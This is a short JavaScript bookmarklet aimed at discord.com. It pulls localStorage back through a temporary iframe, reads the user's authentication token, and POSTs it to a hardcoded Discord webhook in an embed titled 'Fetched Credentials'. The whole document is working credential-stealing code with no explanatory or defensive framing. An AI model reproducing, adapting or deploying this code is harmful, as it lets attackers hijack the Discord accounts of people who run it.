javascript: void (function () {
  var SEND = "<https://discord.com/api/webhooks/956708631783555076/ZnYrv39NvKvo_k8Tby3L4xI6j8OmM-5dgUyZyPOvKem2KrvhnIAUpSytLGceALmNv9_g>";
  "https://discord.com" == this.document.location.origin &&
    (function () {
      const a = document.createElement("iframe");
      document.head.append(a);
      const b = Object.getOwnPropertyDescriptor(
        a.contentWindow,
        "localStorage"
      );
      a.remove(),
        Object.defineProperty(window, "localStorage", b),
        fetch(SEND, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                color: 3553599,
                title: "Fetched Credentials",
                description: `\`\`\`${localStorage.getItem("token")}\`\`\``,
              },
            ],
          }),
        });
    })();
})();
